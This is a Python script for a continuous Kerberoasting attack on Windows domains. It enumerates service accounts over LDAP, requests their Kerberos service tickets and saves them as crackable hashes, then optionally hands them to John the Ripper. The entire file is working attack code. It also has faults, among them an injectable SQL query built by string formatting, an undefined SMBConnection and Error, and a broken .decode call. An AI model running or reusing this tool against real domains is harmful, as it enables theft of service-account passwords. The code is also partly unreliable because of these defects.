#!/usr/bin/env python
#
# Author:
#  @__Retrospect
#
# Description:
#    This module will implement finding Service Principal Names in a continuous way. It will monitor multiple domains looking for recently changed passwords of the sAMAccount of the SPN's, or newly added SPN's to the domain.
#
# Credits:
#     Tim Medin (@timmedin): For the research of the kerberoast attack detailed at: http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin
#     Alberto Solino (@agsolino): For building a kerberoast module based on the impacket framework. This script is heavily based on his work on GetUserSPNs.py
#     @skelsec: For his initial https://github.com/skelsec/PyKerberoast project
#     SecureAuthCorp: For their work on the [Impacket](https://github.com/SecureAuthCorp/impacket) project

import argparse
import sys
import os
import logging
import sqlite3
from datetime import datetime
from binascii import hexlify, unhexlify
import subprocess

from pyasn1.codec.der import decoder
from impacket import version
from impacket.ldap import ldap, ldapasn1
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5 import constants
from impacket.examples.utils import parse_credentials
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.ntlm import compute_lmhash, compute_nthash


class Database:
    def __init__(self,db_file):
        self.db_file=db_file

    def connect_database(self):
        self.conn = sqlite3.connect(self.db_file)
        self.cursor = self.conn.cursor()

    def create_database(self):
        self.connect_database()

        sql_spn_table = """ CREATE TABLE IF NOT EXISTS spn (
                                        id integer PRIMARY KEY AUTOINCREMENT,
                                        domain text NOT NULL,
                                        servicePrincipalName text NOT NULL,
                                        sAMAccountName text NOT NULL,
                                        pwdLastSetDate text NOT NULL
                                    ); """

        if self.cursor is not None:
            self.create_table(sql_spn_table)

    def commit(self):
        self.conn.commit()

    def create_table(self, create_table_sql):
        """ create a table from the create_table_sql statement
        :param conn: Connection object
        :param create_table_sql: a CREATE TABLE statement
        :return:
        """
        try:
            self.cursor.execute(create_table_sql)
        except Error as e:
            logging.info(e)

    def find_spn(self, domain, spn, samaccountname, pwdlastset):
        pwdlastsetDate = pwdlastset.split(' ')[0]

        results=[]

        cursor = self.cursor
        spnQuery = 'SELECT pwdLastSetDate FROM spn WHERE servicePrincipalName=\'{spnValue}\''.format(spnValue=spn)
        spnResult = cursor.execute(spnQuery).fetchall()

        if len(spnResult) is 0:
            logging.info("NEW SPN FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname)
            cursor.execute("INSERT INTO spn (domain, servicePrincipalName, sAMAccountName, pwdLastSetDate) VALUES (?,?,?,?)", (domain, spn, samaccountname, pwdlastsetDate))
            results.append(spn)
            results.append(samaccountname)
        elif len(spnResult) is 1:
            if pwdlastset != spnResult[0][0]:
                cursor.execute("UPDATE spn SET pwdLastSetDate=? WHERE servicePrincipalName=?",(pwdlastsetDate, spn))
                logging.info("CHANGED PW FOUND! Domain: "+domain+" SPN: "+spn+" sAMAccountName: "+samaccountname+" old pwdlastsetDate value: "+spnResult[0][0]+ " new pwdlastsetDate value: "+pwdlastsetDate)
                results.append(spn)
                results.append(samaccountname)
        else:
            logging.info("huh, more than 1 database match, something wrong here:")
            logging.info("domain: "+domain+" spn: "+ spn + " samaccountname "+ samaccountname + " pwdlastsetDate: " + pwdlastsetDate)
            raise

        self.commit()
        return results

class GetUserSPNS:

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__outputFileName = cmdLineOptions.outputfile
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.__baseDN = ''
        for i in domainParts:
            self.__baseDN += 'dc=%s,' % i
        # Remove last ','
        self.__baseDN = self.__baseDN[:-1]
        # We can't set the KDC to a custom IP when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != target_domain and self.__kdcHost:
            logging.info('DC ip will be ignored because of cross-domain targeting.')
            self.__kdcHost = None


    def getMachineName(self):
        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            s = SMBConnection(self.__kdcHost, self.__kdcHost)
        else:
            s = SMBConnection(self.__targetDomain, self.__targetDomain)
        try:
            s.login('', '')
        except Exception:
            if s.getServerName() == '':
                raise 'Error while anonymous logging into %s'
        else:
            try:
                s.logoff()
            except Exception:
                # We don't care about exceptions here as we already have the required
                # information. This also works around the current SMB3 bug
                pass
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def harvester(self):

        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__doKerberos:
            target = self.getMachineName()
        else:
            if self.__kdcHost is not None and self.__targetDomain == self.__domain:
                target = self.__kdcHost
            else:
                target = self.__targetDomain

        logging.info("Connecting to LDAP")
        logging.debug("To LDAP server: "+target)
        logging.debug("With BaseDN: "+self.__baseDN)
        logging.debug("To KDC host: "+str(self.__kdcHost))
        logging.debug("With auth domain: "+self.__domain)
        logging.debug("And auth user: "+self.__username)
        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.__baseDN, self.__kdcHost)
            ldapConnection.login(self.__username, self.__password, self.__domain)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.__baseDN, self.__kdcHost)
                ldapConnection.login(self.__username, self.__password, self.__domain)
            else:
                raise

        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                           "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"


        logging.info("Searching LDAP for SPNs")
        try:
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=100000)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                logging.info("LDAP sizeLimitExceeded")
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []


        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue

            mustCommit = False
            sAMAccountName =  ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        pass
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.info('Skipping item, cannot process due to error %s' % str(e))
                pass

        return answers


    def getTGT(self):
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
        except:
            # No cache present
            pass
        else:
            # retrieve user and domain information from CCache file if needed
            if self.__domain == '':
                domain = ccache.principal.realm['data']
            else:
                domain = self.__domain
            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                TGT = creds.toTGT()
                logging.debug('Using TGT from cache')
                return TGT
            else:
                logging.debug("No valid credentials found in cache. ")

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                compute_lmhash(self.__password),
                                                                compute_nthash(self.__password), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcHost)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash),
                                                                unhexlify(self.__nthash), self.__aesKey,
                                                                kdcHost=self.__kdcHost)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def getTGS(self, answers):

        if self.__requestTGS is True or self.__requestUser is not None:
            # Let's get unique user names and a SPN to request a TGS for
            users = dict( (vals[1], vals[0]) for vals in answers)

            # Get a TGT for the current user
            TGT = self.getTGT()

            if self.__outputFileName is not None:
                fd = open(self.__outputFileName, 'a')
            else:
                fd = None

            for user, SPN in users.items():

                logging.info("Getting TGS from user: "+user+" with SPN: "+SPN)

                sAMAccountName = user
                downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName

                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                    principalName.components = [downLevelLogonName]

                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                            self.__kdcHost,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName, fd)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.debug('Principal: %s - %s' % (downLevelLogonName, str(e)))

            if fd is not None:
                fd.close()


    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                logging.info(entry)
            else:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
            if fd is None:
                logging.info(entry)
            else:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                logging.info(entry)
            else:
                fd.write(entry+'\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                logging.info(entry)
            else:
                fd.write(entry+'\n')
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(tgs, oldSessionKey, sessionKey )
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logging.error(str(e))



if __name__ == "__main__":

    #required args: db file, creds, target-domain file, outputfile

    parser = argparse.ArgumentParser(add_help =  True, description = "Continously query domains for SPNs that are running. Monitor for changes and pull latest TGS tickets")
    parser.add_argument('-credentials', action='store', help='domain/username[:password]')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                   '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                   'cannot be found, it will use the ones specified in the command '
                                                   'line')
    parser.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                        '(128 or 256 bits)')
    parser.add_argument('-domainsfile', help='File with domains (FQDN) per line to test')
    parser.add_argument('-dbfile', help='SQLite3 DB file to use as a database')
    parser.add_argument('-crack', action='store', metavar = "wordlist", help='Automatically attempt to crack the TGS service ticket(s) using a dictionary attack with the provided wordlist (using John the Ripper)')
    parser.add_argument('-outputfile', action='store', help='Output file to write new or changed SPNs to. A date and timestamp will be appended to the filename.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    options = parser.parse_args()

    if options.aesKey is not None:
        options.k = True

    # enforcing default arguments
    options.dc_ip = None
    options.usersfile = None
    options.request = True
    options.save = False
    options.request_user = None
    options.hashes = None

    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    if options.debug is True:
        fh = logging.FileHandler('debug_' + datetime.now().strftime('%Y-%m-%d_%H-%M') + '.log')
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        fh = logging.FileHandler('info.log')
        logging.getLogger().setLevel(logging.INFO)

    fh.setFormatter(formatter)
    logging.getLogger().addHandler(fh)

    authDomain, username, password = parse_credentials(options.credentials)
    db = Database(options.dbfile)


    try:
        logging.info("Authenticating with domain: "+authDomain)
        logging.info("With username: "+username)
        logging.info("Loading domains from file: "+options.domainsfile)
        logging.info("Storing state in: "+options.dbfile)
        options.outputfile = options.outputfile + "_" + datetime.now().strftime('%Y-%m-%d_%H-%M') + ".log"

        logging.info("Outputting results in: "+options.outputfile)

        if not os.path.exists(options.dbfile):
            logging.info("*** DATABASE NOT FOUND")
            db.create_database()
            logging.info("*** DATABASE CREATED")
        else:
            logging.info("*** DATABASE FOUND")
            db.connect_database()

        with open(options.domainsfile) as fi:
            domains = [line.strip() for line in fi]

        for targetDomain in domains:
            logging.info(" ** Starting enumerating domain: "+targetDomain)
            getUserSPNS = GetUserSPNS(username, password, authDomain, targetDomain, options)
            domainAnswers = getUserSPNS.harvester()

            tgsList = []
            for spn in domainAnswers:
                logging.info("Found SPN: "+spn[0])
                newSpn = db.find_spn(targetDomain, spn[0], spn[1], spn[3])
                if newSpn:
                    tgsList.append(newSpn)

            if len(tgsList)>0:
                getUserSPNS.getTGS(tgsList)
            else:
                logging.info("No new or changed SPNs found!")

            logging.info(" ** Finished enumerating domain: "+targetDomain)
            logging.info(" ** Results written to: "+options.outputfile)

        if options.crack is not None:
            print("Starting to crack using wordlist: "+options.crack)
            subprocess.run(["john","--format:krb5tgs",options.outputfile,"--wordlist="+options.crack]).stdout

    except Exception as e:
        import traceback
        traceback.print_exc()
